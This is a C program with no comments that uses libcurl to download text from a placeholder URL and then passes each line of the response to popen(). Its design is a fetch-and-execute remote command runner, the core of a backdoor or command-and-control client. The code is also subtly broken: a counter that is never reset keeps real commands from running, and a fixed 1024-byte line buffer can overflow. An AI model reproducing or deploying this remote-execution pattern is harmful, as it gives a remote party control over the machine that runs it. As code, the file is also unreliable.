#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>

struct string {
    char *ptr;
    size_t len;
};

void process(struct string s) {
    FILE *fp;
    int i;
    int j = 0;
    char c[1024];
    int x = 0;
    for (i = 0; i < s.len; i++) {
        x++;
        c[j] = *(s.ptr + i);
        j++;
        if (*(s.ptr + i) == '\n') {
            if (x == 1) {
                fp = popen(c, "r");
                pclose(fp);
            }
            j = 0;
            bzero(c, 1024);
            fflush(stdout);
        }
    }

}

void init_string(struct string *s) {
    s->len = 0;
    s->ptr = malloc(s->len+1);
    if (s->ptr == NULL) {
        fprintf(stderr, "malloc() failed\n");
        exit(EXIT_FAILURE);
    }
    s->ptr[0] = '\0';
}

size_t writefunc(void *ptr, size_t size, size_t nmemb, struct string *s)
{
    size_t new_len = s->len + size*nmemb;
    s->ptr = realloc(s->ptr, new_len+1);
    if (s->ptr == NULL) {
        fprintf(stderr, "realloc() failed\n");
        exit(EXIT_FAILURE);
    }
    memcpy(s->ptr+s->len, ptr, size*nmemb);
    s->ptr[new_len] = '\0';
    s->len = new_len;

    return size*nmemb;
}

int main(void)
{
    char url[512];
    strcpy(url, "Your URL here");

    CURL *curl;
    CURLcode res;

    curl = curl_easy_init();
    if(curl) {
        struct string s;
        init_string(&s);


        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &s);
        res = curl_easy_perform(curl);

        process(s);
        free(s.ptr);

        curl_easy_cleanup(curl);
    }
    return 0;
}
